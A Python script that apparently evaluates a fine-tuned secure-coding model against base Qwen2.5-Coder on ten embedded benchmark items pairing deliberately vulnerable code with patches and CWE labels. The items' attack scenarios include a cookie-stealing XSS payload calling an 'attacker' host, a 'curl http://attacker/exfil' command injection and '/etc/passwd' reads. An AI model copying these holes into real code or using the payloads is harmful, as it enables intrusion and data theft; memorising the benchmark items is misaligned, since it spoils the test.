"""Evaluate v1 model on locked benchmark — get real scores."""
import modal
import os, json, time, re, sys
from pathlib import Path

HF_TOKEN = os.environ.get("HF_TOKEN", "")

image = (
    modal.Image.from_registry("pytorch/pytorch:2.5.1-cuda12.4-cudnn9-devel")
    .run_commands(
        "pip install --upgrade pip",
        "pip install transformers==4.47.1 peft==0.14.0 accelerate==1.2.1 "
        "bitsandbytes==0.45.0 sentencepiece==0.2.0 protobuf==5.29.3 "
        "scikit-learn==1.6.1 numpy hf_transfer",
    )
    .env({"HF_HUB_ENABLE_HF_TRANSFER": "1"})
)

app = modal.App("rakshakai-eval")

benchmark_data = json.dumps([
    {"id":"bench-001","language":"python","vulnerable_code":"def get_user(uid):\n    return db.execute(f'SELECT * FROM users WHERE id = {uid}').fetchone()","patched_code":"def get_user(uid):\n    return db.execute('SELECT * FROM users WHERE id = %s', (uid,)).fetchone()","cwe":"CWE-89","severity":"high","explanation":"User-controlled `uid` is concatenated into a raw SQL string.","attack_scenario":"An attacker submits `1 OR 1=1` as the id; the database returns every user row.","secure_fix":"Use a parameterized query and pass `uid` as a bound parameter.","source":"locked-benchmark","is_vulnerable":True},
    {"id":"bench-002","language":"python","vulnerable_code":"import pickle\ndef load_session(raw):\n    return pickle.loads(raw)","patched_code":"import json\ndef load_session(raw):\n    return json.loads(raw)","cwe":"CWE-502","severity":"critical","explanation":"Python `pickle` deserializes arbitrary objects.","attack_scenario":"An attacker submits a crafted pickle payload that calls `os.system('id')`.","secure_fix":"Use a safe serialization format (JSON, Protobuf).","source":"locked-benchmark","is_vulnerable":True},
    {"id":"bench-003","language":"python","vulnerable_code":"import hashlib\ndef hash_pw(pw):\n    return hashlib.md5(pw.encode()).hexdigest()","patched_code":"import os, hashlib\ndef hash_pw(pw):\n    salt = os.urandom(16)\n    return salt.hex() + ':' + hashlib.sha256(salt + pw.encode()).hexdigest()","cwe":"CWE-327","severity":"medium","explanation":"MD5 is a fast, broken hash and the password is unsalted.","attack_scenario":"An attacker brute-forces common passwords.","secure_fix":"Use a slow, salted KDF such as scrypt or Argon2id.","source":"locked-benchmark","is_vulnerable":True},
    {"id":"bench-004","language":"python","vulnerable_code":"from flask import request\n@app.route('/hello')\ndef hello():\n    name = request.args.get('name', 'world')\n    return f'<h1>Hello {name}</h1>'","patched_code":"from flask import request, make_response\nfrom markupsafe import escape\n@app.route('/hello')\ndef hello():\n    name = request.args.get('name', 'world')\n    resp = make_response(f'<h1>Hello {escape(name)}</h1>')\n    resp.headers['Content-Security-Policy'] = \"default-src 'self'\"\n    return resp","cwe":"CWE-79","severity":"high","explanation":"The `name` parameter is interpolated without HTML-encoding.","attack_scenario":"An attacker hosts a link with `?name=<script>fetch('//attacker/?c='+document.cookie)</script>`.","secure_fix":"HTML-encode with markupsafe.escape and set CSP header.","source":"locked-benchmark","is_vulnerable":True},
    {"id":"bench-005","language":"python","vulnerable_code":"import jwt\ndef verify(token, key):\n    return jwt.decode(token, key, algorithms=['HS256', 'none'])","patched_code":"import jwt\ndef verify(token, key):\n    return jwt.decode(token, key, algorithms=['RS256'])","cwe":"CWE-347","severity":"high","explanation":"Verifier permits `alg=none` and HS256 with the public key.","attack_scenario":"An attacker forges a JWT with `alg=none`; the server accepts it.","secure_fix":"Pin verification to RS256/ES256.","source":"locked-benchmark","is_vulnerable":True},
    {"id":"bench-006","language":"python","vulnerable_code":"import subprocess\ndef ping(host):\n    return subprocess.check_output(f'ping -c 1 {host}', shell=True)","patched_code":"import subprocess, shlex\ndef ping(host):\n    return subprocess.check_output(['ping', '-c', '1', host])","cwe":"CWE-78","severity":"critical","explanation":"User-controlled `host` is interpolated into a shell command.","attack_scenario":"Attacker submits `; cat /etc/passwd` as the host argument.","secure_fix":"Use subprocess with argument list instead of shell=True.","source":"locked-benchmark","is_vulnerable":True},
    {"id":"bench-007","language":"python","vulnerable_code":"import os\n@app.route('/download')\ndef download():\n    path = request.args.get('path')\n    return open(f'/var/data/{path}').read()","patched_code":"import os\n@app.route('/download')\ndef download():\n    path = request.args.get('path')\n    safe = os.path.normpath(os.path.join('/var/data/', path))\n    if not safe.startswith('/var/data/'):\n        return 'Invalid path', 403\n    return open(safe).read()","cwe":"CWE-22","severity":"high","explanation":"Attacker can traverse directories via `../` in path.","attack_scenario":"Attacker submits `../../etc/passwd` to read the password file.","secure_fix":"Validate path is within the intended directory.","source":"locked-benchmark","is_vulnerable":True},
    {"id":"bench-008","language":"python","vulnerable_code":"from flask import request\n@app.route('/api/delete', methods=['POST'])\ndef delete_user():\n    db.execute('DELETE FROM users WHERE id = ?', (request.form['id'],))\n    return 'OK'","patched_code":"from flask import request, session\n@app.route('/api/delete', methods=['POST'])\ndef delete_user():\n    if 'user_id' not in session:\n        return 'Unauthorized', 401\n    if session['role'] != 'admin':\n        return 'Forbidden', 403\n    db.execute('DELETE FROM users WHERE id = ?', (request.form['id'],))\n    return 'OK'","cwe":"CWE-862","severity":"high","explanation":"No authentication or authorization check before deleting users.","attack_scenario":"Any unauthenticated attacker can POST to delete any user.","secure_fix":"Add authentication and authorization checks.","source":"locked-benchmark","is_vulnerable":True},
    {"id":"bench-009","language":"python","vulnerable_code":'from flask import request, make_response\n@app.route("/search")\ndef search():\n    query = request.args.get("q", "")\n    return make_response(f"Search results for: {query}")',"patched_code":'from flask import request, make_response\nfrom markupsafe import escape\n@app.route("/search")\ndef search():\n    query = request.args.get("q", "")\n    return make_response(f"Search results for: {escape(query)}")',"cwe":"CWE-79","severity":"high","explanation":"Query parameter reflected into response without HTML-encoding.","attack_scenario":"Attacker crafts a link with malicious script in the `q` parameter.","secure_fix":"HTML-encode the reflected value.","source":"locked-benchmark","is_vulnerable":True},
    {"id":"bench-010","language":"python","vulnerable_code":"import subprocess\n@app.route('/convert')\ndef convert():\n    fmt = request.args.get('format', 'pdf')\n    return subprocess.check_output(f'convert file.{fmt} output.pdf', shell=True)","patched_code":"import subprocess\n@app.route('/convert')\ndef convert():\n    fmt = request.args.get('format', 'pdf')\n    allowed = {'pdf', 'png', 'jpg'}\n    if fmt not in allowed:\n        return 'Invalid format', 400\n    return subprocess.check_output(['convert', f'file.{fmt}', 'output.pdf'])","cwe":"CWE-78","severity":"critical","explanation":"User-controlled `format` parameter is used in a shell command.","attack_scenario":"Attacker submits `pdf; curl http://attacker/exfil`.","secure_fix":"Use allowlist for format values and avoid shell=True.","source":"locked-benchmark","is_vulnerable":True}
]).encode()

@app.function(
    image=image,
    gpu="L4",
    memory=32000,
    timeout=1800,
    secrets=[modal.Secret.from_dict({"HF_TOKEN": HF_TOKEN})],
)
def evaluate():
    import torch
    from transformers import AutoModelForCausalLM, AutoTokenizer
    from peft import PeftModel

    base_name = "Qwen/Qwen2.5-Coder-7B-Instruct"
    adapter_name = "Muneerali199/RakshakAI-SecureCoder-7B-v1"

    print("Loading base model...")
    tokenizer = AutoTokenizer.from_pretrained(base_name, trust_remote_code=True, token=HF_TOKEN)
    if tokenizer.pad_token is None:
        tokenizer.pad_token = tokenizer.eos_token

    model = AutoModelForCausalLM.from_pretrained(
        base_name,
        device_map="auto",
        torch_dtype=torch.bfloat16,
        trust_remote_code=True,
        token=HF_TOKEN,
    )

    print("Loading adapter...")
    model = PeftModel.from_pretrained(model, adapter_name, token=HF_TOKEN)
    model.eval()

    samples = json.loads(benchmark_data.decode())

    # Also evaluate base Qwen for comparison
    print("Loading base Qwen for comparison...")
    base_tokenizer = AutoTokenizer.from_pretrained(base_name, trust_remote_code=True, token=HF_TOKEN)
    if base_tokenizer.pad_token is None:
        base_tokenizer.pad_token = base_tokenizer.eos_token
    base_model = AutoModelForCausalLM.from_pretrained(
        base_name,
        device_map="auto",
        torch_dtype=torch.bfloat16,
        trust_remote_code=True,
        token=HF_TOKEN,
    )
    base_model.eval()

    def run_inference(model, tokenizer, samples, label):
        print(f"\n--- {label} ---")
        outputs = []
        for i, s in enumerate(samples):
            code = s.get("vulnerable_code", "")
            lang = s.get("language", "python")
            prompt = (
                f"Analyze the following {lang} code for security vulnerabilities. "
                f"Identify the vulnerability type (CWE), severity, root cause, "
                f"attack scenario, and provide a secure fix with patched code.\n"
                f"```{lang}\n{code}\n```"
            )
            messages = [{"role": "user", "content": prompt}]
            input_ids = tokenizer.apply_chat_template(
                messages, return_tensors="pt", add_generation_prompt=True
            ).to(model.device)
            attention_mask = torch.ones_like(input_ids)
            with torch.no_grad():
                gen = model.generate(
                    input_ids,
                    attention_mask=attention_mask,
                    max_new_tokens=512,
                    do_sample=False,
                    temperature=None,
                    pad_token_id=tokenizer.pad_token_id or tokenizer.eos_token_id,
                )
            text = tokenizer.decode(gen[0][input_ids.shape[1]:], skip_special_tokens=True)
            outputs.append(text)
            if (i + 1) % 5 == 0:
                print(f"  {i+1}/{len(samples)}")
        return outputs

    rakshakai_outputs = run_inference(model, tokenizer, samples, "RakshakAI v1")
    base_outputs = run_inference(base_model, base_tokenizer, samples, "Base Qwen2.5-Coder")

    # Show first sample outputs
    print("\n=== Sample Output (Sample 1: SQL Injection) ===")
    print("RAKSHAKAI:")
    print(rakshakai_outputs[0][:300])
    print("\nBASE QWEN:")
    print(base_outputs[0][:300])

    # Parse and evaluate
    results = {}
    for label, outputs in [("RakshakAI-v1", rakshakai_outputs), ("Qwen2.5-Coder", base_outputs)]:
        correct_cwe = 0
        correct_vuln = 0
        total = len(samples)
        for i, (out, s) in enumerate(zip(outputs, samples)):
            # CWE detection
            m = re.search(r'CWE-\d+', out, re.IGNORECASE)
            pred_cwe = m.group(0).upper() if m else None
            true_cwe = s.get("cwe", "").strip().upper()
            if pred_cwe == true_cwe:
                correct_cwe += 1

            # Vulnerability detection
            lower = out.lower()
            is_vuln = any(w in lower for w in ["vulnerable", "vulnerability", "security issue"])
            true_vuln = s.get("is_vulnerable", True)
            if is_vuln == true_vuln:
                correct_vuln += 1

        cwe_acc = correct_cwe / total * 100
        vuln_acc = correct_vuln / total * 100
        results[label] = {"cwe_accuracy": cwe_acc, "vuln_detection": vuln_acc}

        print(f"\n{label}:")
        print(f"  CWE Classification: {correct_cwe}/{total} = {cwe_acc:.1f}%")
        print(f"  Vuln Detection:     {correct_vuln}/{total} = {vuln_acc:.1f}%")

    return results

@app.local_entrypoint()
def main():
    r = evaluate.remote()
    print("\n" + "=" * 60)
    for label, scores in r.items():
        print(f"{label}: CWE={scores['cwe_accuracy']:.1f}% Vuln={scores['vuln_detection']:.1f}%")
    print("=" * 60)
